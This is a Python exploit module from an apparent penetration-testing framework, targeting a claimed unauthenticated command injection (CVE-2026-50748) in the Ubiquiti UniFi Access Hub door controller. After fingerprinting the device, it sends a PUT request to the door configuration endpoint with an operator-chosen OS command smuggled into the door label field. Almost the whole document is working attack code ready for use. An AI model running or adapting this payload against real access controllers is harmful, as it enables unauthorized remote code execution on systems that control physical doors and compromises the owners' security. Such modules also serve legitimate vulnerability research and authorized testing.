# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-50748: Ubiquiti UniFi Access Hub Command Injection.

The Ubiquiti UniFi Access Hub management interface fails to sanitize
user-supplied input in the door configuration endpoint. An unauthenticated
attacker can inject arbitrary OS commands via the door label parameter,
achieving remote code execution on the access controller.

CVSS v3.1: 9.9 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
"""
import json
import socket
import ssl

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """Ubiquiti UniFi Access Hub unauthenticated command injection
    via door configuration endpoint (CVE-2026-50748)."""

    __info__ = {
        "name": "CVE-2026-50748: Ubiquiti UniFi Access Hub Command Injection",
        "description": (
            "The UniFi Access Hub management API does not sanitize the "
            "door label field in the configuration endpoint. An "
            "unauthenticated attacker injects OS commands through a "
            "crafted PUT request, gaining remote code execution."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-50748",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi Access Hub (UA-Hub)",
            "Ubiquiti UniFi Access Hub (UA-Hub-EA)",
        ),
        "cve": "CVE-2026-50748",
        "cvss": "9.9",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1059", "T1190"],
        "mitre_tactics": ["Initial Access", "Execution"],
    }

    target = OptIP("", "Target IPv4 address of the UniFi Access Hub")
    port = OptPort(443, "HTTPS port for the Access management API")
    timeout = OptFloat(8.0, "Connection timeout in seconds")
    command = OptString("id", "OS command to inject (PoC; default: id)")
    verify_ssl = OptBool(False, "Verify TLS certificate (default: False)")

    _API_DOOR_CFG = "/api/access/door/config"
    _API_INFO = "/api/access/info"

    @mute
    def check(self) -> bool:
        """Fingerprint the UniFi Access Hub via its info endpoint."""
        if HAS_REQUESTS:
            try:
                url = f"https://{self.target}:{self.port}{self._API_INFO}"
                resp = requests.get(
                    url, timeout=self.timeout, verify=self.verify_ssl
                )
                body = resp.text.lower()
                return "access" in body and "unifi" in body
            except Exception:
                pass
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection(
                (self.target, self.port), timeout=self.timeout
            ) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.target) as tls:
                    tls.sendall(
                        f"GET {self._API_INFO} HTTP/1.0\r\n"
                        f"Host: {self.target}\r\n\r\n".encode()
                    )
                    banner = tls.recv(4096).decode(errors="replace").lower()
                    return "access" in banner and "unifi" in banner
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(
                f"UniFi Access Hub detected at {self.target}:{self.port}"
            )
        else:
            print_warning("Service not positively identified; proceeding anyway")

        self._exploit()

    def _exploit(self) -> None:
        payload_label = f"MainDoor;{self.command};"
        body = json.dumps({
            "doorId": "door-01",
            "label": payload_label,
            "lockRelay": 1,
            "autoLockTimeout": 5,
        })

        url = f"https://{self.target}:{self.port}{self._API_DOOR_CFG}"
        headers = {"Content-Type": "application/json"}

        print_status(f"Sending command injection to {url}")
        print_info(f"Injected via door label: {payload_label}")

        if HAS_REQUESTS:
            try:
                resp = requests.put(
                    url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )
                print_info(f"HTTP {resp.status_code}")
                if resp.status_code in (200, 204):
                    print_success(
                        "Door configuration accepted. If the target is "
                        "vulnerable, the injected command was executed."
                    )
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Request failed: {exc}")
        else:
            print_warning("requests library not installed; showing payload")
            print_info(f"PUT {url}")
            print_info(f"Body: {body}")
